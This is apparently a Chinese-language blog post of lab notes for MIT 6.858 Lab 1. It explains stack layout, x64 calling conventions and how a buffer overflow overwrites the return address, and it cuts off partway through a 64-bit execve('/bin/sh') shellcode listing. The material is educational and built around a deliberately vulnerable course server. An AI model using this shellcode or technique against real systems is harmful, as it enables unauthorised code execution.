@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="Lab 1：Buffer overflows">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+  <title>MIT 6.858 Computer Systems Security - Lab 1 |  Hexo</title>
+  
+    <link rel="apple-touch-icon" sizes="57x57" href="/images/DMX_cat.jpg/apple-touch-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/images/DMX_cat.jpg/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/images/DMX_cat.jpg/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/images/DMX_cat.jpg/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/images/DMX_cat.jpg/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/images/DMX_cat.jpg/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/images/DMX_cat.jpg/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/DMX_cat.jpg/apple-touch-icon-180x180.png">
+    <link rel="apple-touch-icon" sizes="167x167" href="/images/DMX_cat.jpg/apple-touch-icon-167x167.png">
+  
+  
+    <link rel="shortcut icon" href="/images/DMX_cat.jpg">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <main class="main">
+    
+	<header id="header" class="header">
+
+	<div class="container">
+		<nav class="navbar d-flex align-items-center">
+			<a class="brand" href="/">
+				<img class="logo lazyload" data-src="/images/DMX_cat.jpg" alt="Hexo" role="img">
+			</a>
+			<ul class="main-nav">
+  
+    
+  <li class="nav-item ">
+    <a class="nav-item-link" href="/">首页</a>
+  </li>
+  
+    
+  <li class="nav-item ">
+    <a class="nav-item-link" href="/stories">故事</a>
+  </li>
+  
+    
+  <li class="nav-item ">
+    <a class="nav-item-link" href="/archives">博客</a>
+  </li>
+  
+    
+  <li class="nav-item ">
+    <a class="nav-item-link" href="/about">关于</a>
+  </li>
+  
+</ul>
+		</nav>
+		<a id="mobile-nav-toggle">
+			<span class="mobile-nav-toggle-bar"></span>
+			<span class="mobile-nav-toggle-bar"></span>
+			<span class="mobile-nav-toggle-bar"></span>
+		</a>
+	</div>
+</header>
+
+    <section>
+      <div class="container">
+  <article id="post-MIT-Lab1-实验笔记" class="article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+  
+  <div class="article-cover mb-5">
+    
+  
+    
+      <img class="article-cover-img lazyload" data-src="/images/others/%E4%B9%9D%E6%97%A51.jpg" itemprop="image">
+    
+  
+
+  </div>
+  
+  <div class="article-inner">
+    
+    <header class="article-header">
+      
+      
+  
+    <h1 class="article-title" itemprop="name">
+      MIT 6.858 Computer Systems Security - Lab 1
+    </h1>
+  
+
+      <div class="article-meta">
+        <time class="text-gray" datetime="2025-08-19T16:00:00.000Z" itemprop="datePublished">
+  2025-08-20
+</time>
+        
+      </div>
+      
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      <p>Lab 1: Buffer overflows</p>
+<span id="more"></span>
+
+<hr>
+<link rel="stylesheet" href="/css/MIT.css">
+
+<div class="all">
+
+<h2 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00. Introduction"></a>0x00. Introduction</h2><p><a target="_blank" rel="noopener" href="https://css.csail.mit.edu/6.858/2024/">MIT 6.858</a> 是面向高年级本科生与研究生开设的一门关于计算机系统安全 (secure computer security) 的课程，内容包括 threat models、attacks that compromise security、techniques for achieving security。</p>
+<p>这个课程一共有五个 Lab：</p>
+<ul>
+<li>Lab1：缓冲区溢出 (buffer overflow)</li>
+<li>Lab2：权限分离与服务侧沙箱 (privilege separation and server-side sandboxing)</li>
+<li>Lab3：符号执行 (symbolic execution)</li>
+<li>Lab4：浏览器安全 (browser security)</li>
+<li>Lab5：安全的文件系统 (secure file system)</li>
+</ul>
+<p>前四个 Lab 主要是基于 MIT 开发的一个叫 zookws 的 web server 完成的</p>
+<h2 id="0x01-Environment-Setup"><a href="#0x01-Environment-Setup" class="headerlink" title="0x01. Environment Setup"></a>0x01. Environment Setup</h2><blockquote>
+<p>详见 <a target="_blank" rel="noopener" href="https://css.csail.mit.edu/6.858/2024/labs/lab1.html">Lab1</a></p>
+</blockquote>
+<p>MIT 提供了一个 <a target="_blank" rel="noopener" href="https://web.mit.edu/6.858/2024/6.566-standalone-v24.zip">course VM image</a>，其中有着一个 <code>Ubuntu 22.04</code> 的系统，登录的用户名为 <code>student</code>，密码为 <code>student</code>，下载解压后根据自身的本地环境进行对应的操作。</p>
+<p>我是用的是 VMware 运行：新建虚拟机 → 稍后安装操作系统 → 选择系统 <code>Linux &gt; Debian 9.x 64-bit</code> → 选择现有的虚拟磁盘→选择 <code>6.858-x86_64-v24.vmdk</code> 即可。</p>
+<p>由于系统没有图形界面，故建议使用 ssh 连接虚拟机来做实验。可以使用 <code>ip addr show dev eth0</code> 来查看虚拟机的 IP 地址。</p>
+<p>实验文件通过 Git 版本控制系统分发。课程 Git 仓库地址：<a target="_blank" rel="noopener" href="https://github.com/mit-pdos/6.566-lab-2024">https://github.com/mit-pdos/6.566-lab-2024</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆实验代码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mit-pdos/6.566-lab-2024 lab</span><br><span class="line"><span class="built_in">cd</span> lab</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：必须将代码克隆到 <code>lab</code> 目录中，因为路径名的长度在本实验中很重要。</p>
+<p>确保可以成功编译 zookws web 服务器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p>编译后会生成以下关键文件：</p>
+<ul>
+<li><code>zookd-exstack</code>：具有可执行栈的版本，便于注入可执行代码</li>
+<li><code>zookd-nxstack</code>：具有不可执行栈的版本，需要更复杂的攻击方式</li>
+<li><code>zookd-withssp</code>：启用栈保护的版本</li>
+</ul>
+<p>为了以可预测的方式运行 web 服务器（确保每次运行时栈和内存布局相同），需要使用 <code>clean-env.sh</code> 脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在端口 8080 上启动服务器</span></span><br><span class="line">./clean-env.sh ./zookd 8080</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器中访问：<code>http://IPADDRESS:8080/</code></p>
+<p>其中 <code>IPADDRESS</code> 是虚拟机的 IP 地址（通过 <code>ip addr show dev eth0</code> 查看）。</p>
+<ul>
+<li><strong>zookd</strong>：接收 HTTP 请求的组件，用 C 语言编写，提供静态文件服务并执行动态脚本</li>
+<li><strong>HTTP 相关代码</strong>：位于 <code>http.c</code> 文件中</li>
+<li><strong>动态脚本</strong>：用 Python 编写（本实验不需要理解，漏洞只存在于 C 代码中）</li>
+<li><strong>参考二进制文件</strong>：提供在 <code>bin.tar.gz</code> 中，用于评分</li>
+<li><strong>测试命令</strong>：<code>make check-lab1</code> 将使用 <code>clean-env.sh</code> 和 <code>bin.tar.gz</code> 检查提交</li>
+</ul>
+<div class="bug-card">
+    <h4 class="bug-title">行尾序列问题</h4>
+    <p class="bug-description">所有文件都是 \r\n (CRLF) 行尾序列，在 Linux 环境下导致脚本执行失败</p>
+    <div class="bug-solution">
+        <p>使用<code>dos2unix</code>命令或文本编辑器将所有文件转换为 \n (LF) 行尾序列</p>
+    </div>
+</div>
+
+<div class="bug-card">
+    <h4 class="bug-title">静态文件权限问题</h4>
+    <p class="bug-description">zookd 服务器将 css, html, ico 等静态文件当成可执行程序运行</p>
+    <div class="bug-solution">
+        <p>使用<code>chmod -x *.css *.html *.ico</code>将静态文件权限修改为不可执行</p>
+    </div>
+</div>
+
+
+<h2 id="0x02-Part-1-Finding-buffer-overflows"><a href="#0x02-Part-1-Finding-buffer-overflows" class="headerlink" title="0x02. Part 1: Finding buffer overflows"></a>0x02. Part 1: Finding buffer overflows</h2><h3 id="I-What-is-a-stack-overflow-attack"><a href="#I-What-is-a-stack-overflow-attack" class="headerlink" title="I. What is a stack overflow attack?"></a>I. What is a stack overflow attack?</h3><p>虽然 Aleph One 在 1996 年发表的经典文章《Smashing the Stack for Fun and Profit》长期以来一直是学习缓冲区溢出攻击的首选资料，但自那时起世界已经发生了很大变化。原始的攻击方法通常在现代 64 位机器上不再有效。这部分原因是现在默认启用了许多新的防御机制，但即使禁用这些防御机制，64 位执行环境本身也带来了新的挑战。</p>
+<h4 id="The-Stack-Region"><a href="#The-Stack-Region" class="headerlink" title="The Stack Region"></a>The Stack Region</h4><p>在讨论 64 位环境中的具体变化之前，让我们先回顾一下什么是（栈）缓冲区溢出攻击。</p>
+<p>考虑一个简单的 C 程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">   <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">   copy(argv[<span class="number">1</span>]);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当程序运行时，它会将内存的一部分保留作为栈。程序使用栈来跟踪其运行状态，例如局部变量的值，函数返回地址以及其他状态信息。</p>
+<p>栈从高内存地址开始，新项目被压入栈的较低内存地址，每个函数调用都会获得自己的栈帧。</p>
+<p>当 <code>copy</code> 函数被调用时，栈的结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                   .-------0x00-------.</span><br><span class="line">                   :                  :</span><br><span class="line">                   :       ....       :</span><br><span class="line">                   |------------------|</span><br><span class="line">   &quot;top&quot; of stack  |                  |  &quot;bottom&quot; of memory</span><br><span class="line">                   |   copy&#x27;s frame   |  (low addresses)</span><br><span class="line">                   |                  |</span><br><span class="line">                   |------------------|</span><br><span class="line">                   |                  |</span><br><span class="line">&quot;bottom&quot; of stack  |   main&#x27;s frame   |  &quot;top&quot; of memory</span><br><span class="line">                   |                  |   (high addresses)</span><br><span class="line">                   `------------------`</span><br></pre></td></tr></table></figure>
+
+<p>后压入栈的内容位于栈的”更高”位置，但在”更低”的内存地址</p>
+<p>栈帧至少包含两个关键部分：</p>
+<ol>
+<li>函数局部变量所需的内存（如 <code>copy</code> 中的 <code>buffer</code>）</li>
+<li>函数应该返回的地址</li>
+</ol>
+<p>这种栈结构是理解缓冲区溢出攻击的基础，攻击者可以通过溢出局部变量来覆盖关键的栈数据，如返回地址。</p>
+<h4 id="The-Calling-Convention"><a href="#The-Calling-Convention" class="headerlink" title="The Calling Convention"></a>The Calling Convention</h4><p>为了更详细地理解栈的工作原理，我们需要深入研究一些汇编代码（使用 AT&amp;T 语法）。具体来说，让我们看看在 x64（Intel 和 AMD 的 64 位 CPU 使用的 64 位架构）上，当 <code>main</code> 调用 <code>copy</code> 时会发生什么：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># 这是我们 C 代码的汇编版本，稍作修改以便于理解</span><br><span class="line"># 可以在 godbolt 查看：https://godbolt.org/z/J3oWfn</span><br><span class="line"># 也可以本地生成：</span><br><span class="line">#   $ gcc -o simple.S -S -fno-stack-protector simple.c</span><br><span class="line">#   $ cat simple.S</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">  # ... main() 的各种设置 ...</span><br><span class="line">  # 此时，argv 在 %rax 中</span><br><span class="line">  # 要调用 copy，我们将第一个参数放在 %rdi 寄存器中</span><br><span class="line">  movq    %rax, %rdi</span><br><span class="line"></span><br><span class="line">  # 然后调用 copy。call 指令将 &quot;rip&quot;（指向当前指令的指针）</span><br><span class="line">  # 压入栈中，然后跳转到 copy 的地址</span><br><span class="line">  call    copy(char*)</span><br><span class="line"></span><br><span class="line">  # 这是 copy 发出 ret 指令时返回的位置</span><br><span class="line">  # 之后，main 只是返回，程序退出</span><br><span class="line">  leave</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">copy(char*):</span><br><span class="line">  # 这被称为&quot;函数序言&quot;，出现在几乎每个函数的开头</span><br><span class="line">  # x64 并不要求这样做，但大多数编译器为大多数函数都会生成这样的代码</span><br><span class="line">  </span><br><span class="line">  # 首先，记住调用者栈帧的起始位置</span><br><span class="line">  pushq   %rbp</span><br><span class="line"></span><br><span class="line">  # 然后设置我们的栈帧从这里开始</span><br><span class="line">  movq    %rsp, %rbp</span><br><span class="line"></span><br><span class="line">  # 然后在栈上为局部变量分配空间</span><br><span class="line">  # 这种情况下，为 str 指针分配 8 字节，为 buffer 分配 16 字节</span><br><span class="line">  # 然后编译器向上舍入到 32 字节以保持 16 字节栈对齐</span><br><span class="line">  subq    $32, %rsp</span><br><span class="line"></span><br><span class="line">  # 此时，我们的栈帧看起来像这样：</span><br><span class="line">  # （每行 8 字节宽）</span><br><span class="line">  #</span><br><span class="line">  #     .-------0x00-------.</span><br><span class="line">  #     :                  :</span><br><span class="line">  #     |                  | &lt;- %rsp</span><br><span class="line">  #     |     padding      |</span><br><span class="line">  #     |       str        |</span><br><span class="line">  #     |  buffer[ 0-7  ]  |</span><br><span class="line">  #     |  buffer[ 8-15 ]  | &lt;- %rbp</span><br><span class="line">  #     | [ main&#x27;s  %rbp ] |</span><br><span class="line">  #     | [return address] |</span><br><span class="line">  #     |------------------|</span><br><span class="line">  #     :   main&#x27;s frame   :</span><br><span class="line">  #     `------------------`</span><br><span class="line">  #</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">从另一个角度显示栈帧结构：</span><br><span class="line">内存底部                                                 内存顶部</span><br><span class="line"></span><br><span class="line">        str         buffer         sbp        ret</span><br><span class="line">&lt;-- [        ][ 0           15 ][        ][        ] main...</span><br><span class="line"></span><br><span class="line">栈顶                                                     栈底</span><br></pre></td></tr></table></figure>
+
+<h4 id="The-Function-argument-pass"><a href="#The-Function-argument-pass" class="headerlink" title="The Function argument pass"></a>The Function argument pass</h4><p>x64 调用约定规定函数的第一个参数存放在 <code>%rdi</code> 寄存器中。因此：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 将 str 指针的值存储到局部变量 str 的内存中</span><br><span class="line">movq    %rdi, -24(%rbp)</span><br><span class="line"></span><br><span class="line"># 准备调用 strcpy</span><br><span class="line"># 它需要两个参数：目标和源，分别放在 %rdi 和 %rsi 中</span><br><span class="line"></span><br><span class="line"># 首先，将 buffer[0] 的地址（%rbp 前面 16 字节）放入 %rdi</span><br><span class="line"># leaq 类似 movq，但复制参数的地址而不是内容</span><br><span class="line">leaq    -16(%rbp), %rdi</span><br><span class="line"></span><br><span class="line"># 然后，将 str 的值放入 %rsi</span><br><span class="line">movq    -24(%rbp), %rsi</span><br><span class="line"></span><br><span class="line"># 调用 strcpy</span><br><span class="line">call    strcpy</span><br><span class="line"></span><br><span class="line"># strcpy 返回后，准备打印字符串</span><br><span class="line"># 再次将 buffer[0] 的地址放入 %rdi 作为第一个参数</span><br><span class="line">leaq    -16(%rbp), %rdi</span><br><span class="line">call    puts</span><br><span class="line"></span><br><span class="line"># 最后，准备返回</span><br><span class="line"># 使用 leave 恢复 main 的 %rsp 和 %rbp 值</span><br><span class="line">leave</span><br><span class="line"></span><br><span class="line"># 使用 ret 返回 main</span><br><span class="line"># ret 从栈中弹出返回地址并跳转到该地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>与经典的《Smashing the Stack for Fun and Profit》文章相比，有一个重要区别：<strong>函数参数不再通过栈传递，而是通过寄存器传递</strong>。这是现代 64 位架构的一个重要特点，会影响我们构造缓冲区溢出攻击的方式。</p>
+</blockquote>
+<h4 id="Buffer-Overflows"><a href="#Buffer-Overflows" class="headerlink" title="Buffer Overflows"></a>Buffer Overflows</h4><p>有了前面的背景知识，我们可以很容易理解栈上缓冲区溢出的攻击路径。具体来说，考虑一下如果我们向 <code>buffer</code> 写入超过 16 字节的数据会发生什么。</p>
+<p><strong>溢出的根本原因：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">copy</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">16</span>];         <span class="comment">// 只分配了 16 字节空间</span></span><br><span class="line">   <span class="built_in">strcpy</span>(buffer, str);     <span class="comment">// 但 strcpy 不检查长度！</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>strcpy</code> 函数的特点：</p>
+<ul>
+<li>持续复制字节直到遇到值为 <code>0x00</code> 的字节（空终止符）</li>
+<li><strong>不检查目标缓冲区大小</strong></li>
+<li>不验证用户输入 <code>argv[1]</code> 是否短于 16 字节</li>
+</ul>
+<p>当 <code>buffer</code> 被溢出时，我们称之为<strong>缓冲区溢出</strong>。溢出的后果完全取决于缓冲区后面的内存中存储的是什么。</p>
+<p>让我们重新审视水平栈图：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内存底部                                                 内存顶部</span><br><span class="line">memory                                                memory</span><br><span class="line"></span><br><span class="line">        str         buffer         sbp        ret</span><br><span class="line">&lt;-- [        ][ 0           15 ][        ][        ] main...</span><br><span class="line"></span><br><span class="line">栈顶                                                     栈底</span><br></pre></td></tr></table></figure>
+
+<p><strong>第一阶段：覆盖 saved %rbp</strong></p>
+<ul>
+<li>当输入超过 16 字节时，首先覆盖保存的 <code>%rbp</code> 值</li>
+<li>这个值来自 <code>main</code> 函数，覆盖它通常不会立即造成问题</li>
+</ul>
+<p><strong>第二阶段：覆盖返回地址</strong></p>
+<ul>
+<li>继续溢出会覆盖<strong>返回地址</strong></li>
+<li>这是 <code>copy</code> 函数执行 <code>ret</code> 指令时要跳转的地址</li>
+<li><strong>这是攻击的关键目标</strong></li>
+</ul>
+<p><strong>场景1：覆盖为垃圾数据</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入包含大量 &#x27;A&#x27; 字符</span></span><br><span class="line">./program AAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+<ul>
+<li>返回地址被覆盖为 <code>0x4141414141414141</code>（’A’ 的 ASCII 码）</li>
+<li>程序尝试跳转到这个无效地址</li>
+<li><strong>结果：程序崩溃</strong>（通常是段错误）</li>
+</ul>
+<p><strong>场景2：精心构造的攻击</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入: [16字节填充] + [8字节覆盖rbp] + [8字节恶意地址]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>将返回地址覆盖为<strong>有效的代码地址</strong></li>
+<li>指向攻击者想要执行的代码</li>
+<li><strong>结果：代码执行控制权被劫持</strong></li>
+</ul>
+<p>攻击者可能希望跳转到：<strong>Shell代码</strong>, <strong>恶意函数</strong>, <strong>系统调用</strong>!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">正常情况：</span><br><span class="line">buffer: [用户输入....] -&gt; 正常返回到main</span><br><span class="line"></span><br><span class="line">溢出攻击：</span><br><span class="line">buffer: [AAAAAAAAAAAAAAAA][BBBBBBBB][0x12345678] </span><br><span class="line">        ^16字节填充      ^覆盖rbp   ^恶意返回地址</span><br><span class="line">                                    |</span><br><span class="line">                                    v</span><br><span class="line">                               攻击者的代码</span><br></pre></td></tr></table></figure>
+
+<h4 id="Shell-Code"><a href="#Shell-Code" class="headerlink" title="Shell Code"></a>Shell Code</h4><p>最基本且最容易理解的栈溢出攻击涉及将我们自己的代码注入到程序的内存中，然后用该内存的地址覆盖返回地址，这样当函数返回时就会执行我们的代码。</p>
+<p><strong>攻击示意图：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内存底部                                                 内存顶部</span><br><span class="line">memory                                                memory</span><br><span class="line"></span><br><span class="line">        str         buffer         sbp        ret</span><br><span class="line">&lt;-- [        ][ 0           15 ][        ][        ] main...</span><br><span class="line">                ^                              |</span><br><span class="line">                |------------------------------|</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击步骤：</strong></p>
+<ol>
+<li><strong>用恶意代码填充缓冲区</strong>：将我们想要执行的代码放入 <code>buffer</code> 中</li>
+<li><strong>覆盖返回地址</strong>：将返回地址覆盖为 <code>buffer</code> 的地址</li>
+<li><strong>执行攻击代码</strong>：当函数返回时，跳转到我们的代码</li>
+</ol>
+<p>这种代码通常被称为 <strong>shell code</strong>，因为我们通常想要启动一个 shell，然后可以用它来发出进一步的命令。具体来说，我们放在缓冲区中的是 CPU 知道如何运行的编译汇编代码。</p>
+<p>虽然基本概念与经典的《Smashing the Stack for Fun and Profit》中描述的相同，但我们需要对 64 位程序进行一些调整：</p>
+<p><strong>1. 系统调用约定变化</strong></p>
+<p>根据 <code>man 2 syscall</code> 的输出，64 位系统调用约定与 32 位有所不同：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 32位系统调用</span><br><span class="line">int 0x80        # 使用中断</span><br><span class="line"></span><br><span class="line"># 64位系统调用  </span><br><span class="line">syscall         # 使用 syscall 指令</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数传递方式：</strong></p>
+<ul>
+<li>64位：参数通过 <code>%rdi</code>, <code>%rsi</code>, <code>%rdx</code> 等寄存器传递（与普通函数相同）</li>
+<li>32位：参数通过栈传递</li>
+</ul>
+<p><strong>2. 寄存器使用调整</strong></p>
+<p>由于不同的寄存器用于参数传递，需要调整临时寄存器的使用：</p>
+<ul>
+<li>避免覆盖后续需要用作参数的寄存器值</li>
+<li>例如：避免使用 <code>%esi</code> 作为临时寄存器，因为 <code>%rsi</code> 是第二个参数寄存器</li>
+</ul>
+<p><strong>3. 系统调用号更新</strong></p>
+<p>64位 Linux 中的系统调用号与 32 位不同：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 示例：使用新的系统调用号</span><br><span class="line">movb    $SYS_unlink,%al    # unlink 系统调用</span><br><span class="line">movb    $SYS_exit,%al      # exit 系统调用</span><br></pre></td></tr></table></figure>
+
+<p><strong>优势：</strong><code>execve</code> 和 <code>exit</code> 的代码都不包含零字节，可以直接使用。</p>
+<p>Shell Code 设计要点:</p>
+<ol>
+<li><strong>避免空字节</strong>：shell code 不能包含 <code>\0</code>，否则会被 <code>strcpy</code> 截断</li>
+<li><strong>位置无关代码</strong>：代码应该能在任何内存位置运行</li>
+<li><strong>紧凑性</strong>：代码应该尽可能短小，适应有限的缓冲区空间</li>
+<li><strong>功能性</strong>：通常执行 <code>execve(&quot;/bin/sh&quot;, ...)</code> 来获取 shell 访问权限</li>
+</ol>
+<p>完整的 64 位 <code>execve</code> shell code 示例如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">#define STRING  &quot;/bin/sh&quot;</span><br><span class="line">#define STRLEN  7</span><br><span class="line">#define ARGV    (STRLEN+1)</span><br><span class="line">#define ENVP    (ARGV+8)</span><br><span class="line"></span><br><span class="line">.globl main</span><br><span class="line">        .type   main, @function</span><br><span class="line"></span><br><span class="line"> main:</span><br><span class="line">        jmp     calladdr</span><br><span class="line"></span><br><span class="line"> popladdr:</span><br><span class="line">        popq    %rcx</span><br><span class="line">        movq    %rcx,(ARGV)(%rcx)       /* set up argv pointer to pathname */</span><br><span class="line">        xorq    %rax,%rax               /* get a 64-bit zero value */</span><br><span class="line">        movb    %al,(STRLEN)(%rcx)      /* null-terminate our string */</span><br><span class="line">        movq    %rax,(ENVP)(%rcx)       /* set up null envp */</span><br><span class="line"></span><br><span class="line">        movb    $SYS_execve,%al         /* syscall arg 1: syscall number */</span><br><span class="line">        movq    %rcx,%rdi               /* syscall arg 2: string pathname */</span><br><span class="line">        leaq    ARGV(%rcx),%rsi         /* syscall arg 2: argv */</span><br><span class="line">        leaq    ENVP(%rcx),%rdx         /* syscall arg 3: envp */</span><br><span class="line">        syscall                         /* invoke syscall */</span><br><span class="line"></span><br><span class="line">        movb    $SYS_exit,%al           /* 